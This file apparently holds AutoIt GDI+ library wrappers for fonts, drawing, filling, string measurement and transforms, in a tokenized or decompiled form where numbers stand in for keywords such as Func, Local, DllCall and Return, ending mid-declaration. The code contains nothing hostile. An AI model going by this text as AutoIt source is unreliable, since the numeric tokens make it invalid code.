28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageEncodersSize","uint*",0,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_FONTCREATE($HFAMILY,$FSIZE,$ISTYLE=0,$IUNIT=3)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateFont","handle",$HFAMILY,"float",$FSIZE,"int",$ISTYLE,"int",$IUNIT,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[5]
33
32_GDIPLUS_FONTDISPOSE($HFONT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteFont","handle",$HFONT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_FONTFAMILYCREATE($SFAMILY,$PCOLLECTION=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateFontFamilyFromName","wstr",$SFAMILY,"ptr",$PCOLLECTION,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_FONTFAMILYCREATEFROMCOLLECTION($SFONTNAME,$HFONTCOLLECTION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateFontFamilyFromName","wstr",$SFONTNAME,"ptr",$HFONTCOLLECTION,"ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$ARESULT[0]534287(10,$ARESULT[0],"")
34$ARESULT[3]
33
32_GDIPLUS_FONTFAMILYDISPOSE($HFAMILY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteFontFamily","handle",$HFAMILY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_FONTFAMILYGETCELLASCENT($HFONTFAMILY,$ISTYLE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetCellAscent","handle",$HFONTFAMILY,"int",$ISTYLE,"ushort*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_FONTFAMILYGETCELLDESCENT($HFONTFAMILY,$ISTYLE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetCellDescent","handle",$HFONTFAMILY,"int",$ISTYLE,"ushort*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_FONTFAMILYGETEMHEIGHT($HFONTFAMILY,$ISTYLE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetEmHeight","handle",$HFONTFAMILY,"int",$ISTYLE,"ushort*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_FONTFAMILYGETLINESPACING($HFONTFAMILY,$ISTYLE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetLineSpacing","handle",$HFONTFAMILY,"int",$ISTYLE,"ushort*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_FONTGETHEIGHT($HFONT,$HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetFontHeight","handle",$HFONT,"handle",$HGRAPHICS,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_FONTPRIVATEADDFONT($HFONTCOLLECTION,$SFONTFILE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipPrivateAddFontFile","ptr",$HFONTCOLLECTION,"wstr",$SFONTFILE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_FONTPRIVATEADDMEMORYFONT($HFONTCOLLECTION,$TFONT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipPrivateAddMemoryFont","handle",$HFONTCOLLECTION,"struct*",$TFONT,"int",68($TFONT))
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_FONTPRIVATECOLLECTIONDISPOSE($HFONTCOLLECTION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeletePrivateFontCollection","handle*",$HFONTCOLLECTION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_FONTPRIVATECREATECOLLECTION()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipNewPrivateFontCollection","ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[1]
33
32_GDIPLUS_GRAPHICSCLEAR($HGRAPHICS,$IARGB=-16777216)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGraphicsClear","handle",$HGRAPHICS,"dword",$IARGB)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSCREATEFROMHDC($HDC)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateFromHDC","handle",$HDC,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSCREATEFROMHWND($HWND)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateFromHWND","hwnd",$HWND,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSDISPOSE($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteGraphics","handle",$HGRAPHICS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWARC($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$FSTARTANGLE,$FSWEEPANGLE,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawArc","handle",$HGRAPHICS,"handle",$HPEN,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"float",$FSTARTANGLE,"float",$FSWEEPANGLE)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWBEZIER($HGRAPHICS,$NX1,$NY1,$NX2,$NY2,$NX3,$NY3,$NX4,$NY4,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawBezier","handle",$HGRAPHICS,"handle",$HPEN,"float",$NX1,"float",$NY1,"float",$NX2,"float",$NY2,"float",$NX3,"float",$NY3,"float",$NX4,"float",$NY4)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWCLOSEDCURVE($HGRAPHICS,$APOINTS,$HPEN=0)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawClosedCurve","handle",$HGRAPHICS,"handle",$HPEN,"struct*",$TPOINTS,"int",$ICOUNT)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWCLOSEDCURVE2($HGRAPHICS,$APOINTS,$NTENSION,$HPEN=0)
28$II,$ICOUNT,$TPOINTS,$ARESULT
__GDIPLUS_PENDEFCREATE($HPEN)
$ICOUNT=$APOINTS[0][0]
$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawClosedCurve2","handle",$HGRAPHICS,"handle",$HPEN,"struct*",$TPOINTS,"int",$ICOUNT,"float",$NTENSION)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWCURVE($HGRAPHICS,$APOINTS,$HPEN=0)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawCurve","handle",$HGRAPHICS,"handle",$HPEN,"struct*",$TPOINTS,"int",$ICOUNT)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWCURVE2($HGRAPHICS,$APOINTS,$NTENSION,$HPEN=0)
28$II,$ICOUNT,$TPOINTS,$ARESULT
__GDIPLUS_PENDEFCREATE($HPEN)
$ICOUNT=$APOINTS[0][0]
$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawCurve2","handle",$HGRAPHICS,"handle",$HPEN,"struct*",$TPOINTS,"int",$ICOUNT,"float",$NTENSION)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWELLIPSE($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawEllipse","handle",$HGRAPHICS,"handle",$HPEN,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWIMAGE($HGRAPHICS,$HIMAGE,$NX,$NY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawImage","handle",$HGRAPHICS,"handle",$HIMAGE,"float",$NX,"float",$NY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWIMAGEPOINTSRECT($HGRAPHICS,$HIMAGE,$NULX,$NULY,$NURX,$NURY,$NLLX,$NLLY,$NSRCX,$NSRCY,$NSRCWIDTH,$NSRCHEIGHT,$HIMAGEATTRIBUTES=0,$IUNIT=2)
28$TPOINTS=65("float X; float Y; float X2; float Y2; float X3; float Y3;")
69($TPOINTS,"X",$NULX)
69($TPOINTS,"Y",$NULY)
69($TPOINTS,"X2",$NURX)
69($TPOINTS,"Y2",$NURY)
69($TPOINTS,"X3",$NLLX)
69($TPOINTS,"Y3",$NLLY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawImagePointsRect","handle",$HGRAPHICS,"handle",$HIMAGE,"struct*",$TPOINTS,"int",3,"float",$NSRCX,"float",$NSRCY,"float",$NSRCWIDTH,"float",$NSRCHEIGHT,"int",$IUNIT,"handle",$HIMAGEATTRIBUTES,"ptr",0,"ptr",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWIMAGERECT($HGRAPHICS,$HIMAGE,$NX,$NY,$NW,$NH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawImageRect","handle",$HGRAPHICS,"handle",$HIMAGE,"float",$NX,"float",$NY,"float",$NW,"float",$NH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWIMAGERECTRECT($HGRAPHICS,$HIMAGE,$NSRCX,$NSRCY,$NSRCWIDTH,$NSRCHEIGHT,$NDSTX,$NDSTY,$NDSTWIDTH,$NDSTHEIGHT,$PATTRIBUTES=0,$IUNIT=2)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawImageRectRect","handle",$HGRAPHICS,"handle",$HIMAGE,"float",$NDSTX,"float",$NDSTY,"float",$NDSTWIDTH,"float",$NDSTHEIGHT,"float",$NSRCX,"float",$NSRCY,"float",$NSRCWIDTH,"float",$NSRCHEIGHT,"int",$IUNIT,"handle",$PATTRIBUTES,"ptr",0,"ptr",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWLINE($HGRAPHICS,$NX1,$NY1,$NX2,$NY2,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawLine","handle",$HGRAPHICS,"handle",$HPEN,"float",$NX1,"float",$NY1,"float",$NX2,"float",$NY2)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWPATH($HGRAPHICS,$HPATH,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawPath","handle",$HGRAPHICS,"handle",$HPEN,"handle",$HPATH)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWPIE($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$FSTARTANGLE,$FSWEEPANGLE,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawPie","handle",$HGRAPHICS,"handle",$HPEN,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"float",$FSTARTANGLE,"float",$FSWEEPANGLE)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWPOLYGON($HGRAPHICS,$APOINTS,$HPEN=0)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawPolygon","handle",$HGRAPHICS,"handle",$HPEN,"struct*",$TPOINTS,"int",$ICOUNT)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWRECT($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$HPEN=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawRectangle","handle",$HGRAPHICS,"handle",$HPEN,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSDRAWSTRING($HGRAPHICS,$SSTRING,$NX,$NY,$SFONT="Arial",$FSIZE=10,$IFORMAT=0)
28$HBRUSH=_GDIPLUS_BRUSHCREATESOLID()
28$HFORMAT=_GDIPLUS_STRINGFORMATCREATE($IFORMAT)
28$HFAMILY=_GDIPLUS_FONTFAMILYCREATE($SFONT)
28$HFONT=_GDIPLUS_FONTCREATE($HFAMILY,$FSIZE)
28$TLAYOUT=_GDIPLUS_RECTFCREATE($NX,$NY,0,0)
28$AINFO=_GDIPLUS_GRAPHICSMEASURESTRING($HGRAPHICS,$SSTRING,$HFONT,$TLAYOUT,$HFORMAT)
4@ERROR534287(@ERROR,@EXTENDED,0)
28$ARESULT=_GDIPLUS_GRAPHICSDRAWSTRINGEX($HGRAPHICS,$SSTRING,$HFONT,$AINFO[0],$HFORMAT,$HBRUSH)
28$IERROR=@ERROR,$IEXTENDED=@EXTENDED
_GDIPLUS_FONTDISPOSE($HFONT)
_GDIPLUS_FONTFAMILYDISPOSE($HFAMILY)
_GDIPLUS_STRINGFORMATDISPOSE($HFORMAT)
_GDIPLUS_BRUSHDISPOSE($HBRUSH)
34287($IERROR,$IEXTENDED,$ARESULT)
33
32_GDIPLUS_GRAPHICSDRAWSTRINGEX($HGRAPHICS,$SSTRING,$HFONT,$TLAYOUT,$HFORMAT,$HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawString","handle",$HGRAPHICS,"wstr",$SSTRING,"int",-1,"handle",$HFONT,"struct*",$TLAYOUT,"handle",$HFORMAT,"handle",$HBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLCLOSEDCURVE($HGRAPHICS,$APOINTS,$HBRUSH=0)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillClosedCurve","handle",$HGRAPHICS,"handle",$HBRUSH,"struct*",$TPOINTS,"int",$ICOUNT)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLCLOSEDCURVE2($HGRAPHICS,$APOINTS,$NTENSION,$HBRUSH=0,$IFILLMODE=0)
28$II,$ICOUNT,$TPOINTS,$ARESULT
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
$ICOUNT=$APOINTS[0][0]
$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
$ARESULT=58($__G_HGDIPDLL,"int","GdipFillClosedCurve2","handle",$HGRAPHICS,"handle",$HBRUSH,"struct*",$TPOINTS,"int",$ICOUNT,"float",$NTENSION,"int",$IFILLMODE)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLELLIPSE($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$HBRUSH=0)
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillEllipse","handle",$HGRAPHICS,"handle",$HBRUSH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLPATH($HGRAPHICS,$HPATH,$HBRUSH=0)
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillPath","handle",$HGRAPHICS,"handle",$HBRUSH,"handle",$HPATH)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLPIE($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$FSTARTANGLE,$FSWEEPANGLE,$HBRUSH=0)
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillPie","handle",$HGRAPHICS,"handle",$HBRUSH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"float",$FSTARTANGLE,"float",$FSWEEPANGLE)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLPOLYGON($HGRAPHICS,$APOINTS,$HBRUSH=0)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillPolygon","handle",$HGRAPHICS,"handle",$HBRUSH,"struct*",$TPOINTS,"int",$ICOUNT,"int","FillModeAlternate")
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLRECT($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$HBRUSH=0)
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillRectangle","handle",$HGRAPHICS,"handle",$HBRUSH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSFILLREGION($HGRAPHICS,$HREGION,$HBRUSH=0)
__GDIPLUS_BRUSHDEFCREATE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFillRegion","handle",$HGRAPHICS,"handle",$HBRUSH,"handle",$HREGION)
__GDIPLUS_BRUSHDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSGETCOMPOSITINGMODE($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetCompositingMode","handle",$HGRAPHICS,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSGETCOMPOSITINGQUALITY($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetCompositingQuality","handle",$HGRAPHICS,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSGETDC($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetDC","handle",$HGRAPHICS,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSGETINTERPOLATIONMODE($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetInterpolationMode","handle",$HGRAPHICS,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSGETSMOOTHINGMODE($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetSmoothingMode","handle",$HGRAPHICS,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
23$ARESULT[2]
21$GDIP_SMOOTHINGMODE_NONE
340
21$GDIP_SMOOTHINGMODE_HIGHQUALITY,$GDIP_SMOOTHINGMODE_ANTIALIAS8X4
341
21$GDIP_SMOOTHINGMODE_ANTIALIAS8X8
342
216
340
24
33
32_GDIPLUS_GRAPHICSGETTRANSFORM($HGRAPHICS,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetWorldTransform","handle",$HGRAPHICS,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSMEASURECHARACTERRANGES($HGRAPHICS,$SSTRING,$HFONT,$TLAYOUT,$HSTRINGFORMAT)
28$ICOUNT=_GDIPLUS_STRINGFORMATGETMEASURABLECHARACTERRANGECOUNT($HSTRINGFORMAT)
4@ERROR534287(@ERROR,@EXTENDED,0)
28$TREGIONS=65("handle["&$ICOUNT&"]")
28$AREGIONS[$ICOUNT+1]=[$ICOUNT]
13$II=115$ICOUNT
$AREGIONS[$II]=_GDIPLUS_REGIONCREATE()
69($TREGIONS,1,$AREGIONS[$II],$II)
14
58($__G_HGDIPDLL,"int","GdipMeasureCharacterRanges","handle",$HGRAPHICS,"wstr",$SSTRING,"int",-1,"hwnd",$HFONT,"struct*",$TLAYOUT,"handle",$HSTRINGFORMAT,"int",$ICOUNT,"struct*",$TREGIONS)
28$IERROR=@ERROR,$IEXTENDED=@EXTENDED
4$IERROR5
13$II=115$ICOUNT
_GDIPLUS_REGIONDISPOSE($AREGIONS[$II])
14
34287($IERROR+10,$IEXTENDED,0)
8
34$AREGIONS
33
32_GDIPLUS_GRAPHICSMEASURESTRING($HGRAPHICS,$SSTRING,$HFONT,$TLAYOUT,$HFORMAT)
28$TRECTF=65($TAGGDIPRECTF)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipMeasureString","handle",$HGRAPHICS,"wstr",$SSTRING,"int",-1,"handle",$HFONT,"struct*",$TLAYOUT,"handle",$HFORMAT,"struct*",$TRECTF,"int*",0,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
28$AINFO[3]
$AINFO[0]=$TRECTF
$AINFO[1]=$ARESULT[8]
$AINFO[2]=$ARESULT[9]
34$AINFO
33
32_GDIPLUS_GRAPHICSRELEASEDC($HGRAPHICS,$HDC)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipReleaseDC","handle",$HGRAPHICS,"handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSRESETCLIP($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipResetClip","handle",$HGRAPHICS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSRESETTRANSFORM($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipResetWorldTransform","handle",$HGRAPHICS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSRESTORE($HGRAPHICS,$ISTATE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipRestoreGraphics","handle",$HGRAPHICS,"uint",$ISTATE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSROTATETRANSFORM($HGRAPHICS,$FANGLE,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipRotateWorldTransform","handle",$HGRAPHICS,"float",$FANGLE,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSAVE($HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSaveGraphics","handle",$HGRAPHICS,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_GRAPHICSSCALETRANSFORM($HGRAPHICS,$FSCALEX,$FSCALEY,$IORDER=0)
